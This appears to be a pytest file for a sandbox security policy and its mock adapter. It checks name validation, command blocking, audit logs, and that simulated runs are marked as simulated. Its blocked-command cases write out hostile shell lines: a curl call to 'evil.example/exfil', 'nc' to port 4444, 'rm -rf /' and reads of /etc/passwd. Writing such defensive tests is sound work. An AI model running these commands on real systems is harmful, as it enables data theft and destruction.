from __future__ import annotations

import json
from pathlib import Path

import pytest

from app.sandbox_runner import (
    InvalidSandboxName,
    MockSandboxAdapter,
    SandboxUnavailableError,
    SecurityPolicy,
    create_adapter,
    validate_sandbox_name,
)


def test_sandbox_name_accepts_contract_pattern() -> None:
    assert validate_sandbox_name("sbx-abc12345") == "sbx-abc12345"


@pytest.mark.parametrize(
    "name",
    ["sbx-short", "sandbox-12345678", "sbx-ABC12345", "sbx-abc 12345", ""],
)
def test_sandbox_name_rejects_invalid_values(name: str) -> None:
    with pytest.raises(InvalidSandboxName):
        validate_sandbox_name(name)


def test_policy_blocks_sensitive_path() -> None:
    decision = SecurityPolicy().check("cat /etc/passwd")
    assert decision.decision == "block"
    assert "sensitive host file" in decision.reason


@pytest.mark.parametrize(
    "command",
    [
        "curl https://evil.example/exfil",
        "pip install malware",
        "bash -c 'echo owned'",
        "python -c 'print(1)'",
        "rm -rf /",
        "nc 10.0.0.1 4444",
    ],
)
def test_policy_blocks_dangerous_commands(command: str) -> None:
    assert SecurityPolicy().check(command).decision == "block"


def test_policy_allows_safe_readiness_command() -> None:
    assert SecurityPolicy().check("echo flowscout-ready").decision == "allow"


def test_policy_allows_sandbox_browser_probe_and_readback() -> None:
    policy = SecurityPolicy()
    assert policy.check("python3 /workspace/flowscout/live_smoke.py").decision == "allow"
    assert policy.check("base64 -w0 /workspace/flowscout/live-smoke.png").decision == "allow"
    assert policy.check("python3 /tmp/evil.py").decision == "block"
    assert policy.check("base64 -w0 /etc/passwd").decision == "block"


def test_mock_log_has_required_audit_fields(tmp_path: Path) -> None:
    log = tmp_path / "commands.jsonl"
    adapter = MockSandboxAdapter(command_log_path=log)
    adapter.create("sbx-logtest01")
    adapter.run_command("sbx-logtest01", "cat /etc/passwd")
    adapter.delete("sbx-logtest01")
    rows = [json.loads(line) for line in log.read_text(encoding="utf-8").splitlines()]
    blocked = next(row for row in rows if row["command"] == "cat /etc/passwd")
    for key in ("ts", "sandbox_name", "command", "decision", "execution_target"):
        assert key in blocked
    assert blocked["execution_target"] == "celesto_sandbox"
    assert blocked["decision"] == "block"
    assert blocked["execution_mode"] == "mock"


def test_mock_command_is_marked_simulated(tmp_path: Path) -> None:
    adapter = MockSandboxAdapter(command_log_path=tmp_path / "log.jsonl")
    adapter.create("sbx-simulated1")
    result = adapter.run_command("sbx-simulated1", "echo hello")
    assert result.ok
    assert result.simulated is True
    assert result.execution_mode == "mock"


def test_mock_test_execution_never_claims_a_pass(tmp_path: Path) -> None:
    adapter = MockSandboxAdapter(command_log_path=tmp_path / "log.jsonl")
    adapter.create("sbx-simulated2")
    result = adapter.execute_playwright_test(
        "sbx-simulated2", "/workspace/flowscout/test.spec.ts"
    )
    assert result.exit_code == 127
    assert "does not execute Playwright" in result.stderr


def test_live_mode_never_silently_falls_back(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("CELESTO_API_KEY", "")
    with pytest.raises(SandboxUnavailableError):
        create_adapter("live")


def test_adapter_deletion_is_idempotent(tmp_path: Path) -> None:
    adapter = MockSandboxAdapter(command_log_path=tmp_path / "log.jsonl")
    adapter.create("sbx-idempotent1")
    assert adapter.delete("sbx-idempotent1").ok
    assert adapter.delete("sbx-idempotent1").ok
    assert adapter.get_info("sbx-idempotent1") is None
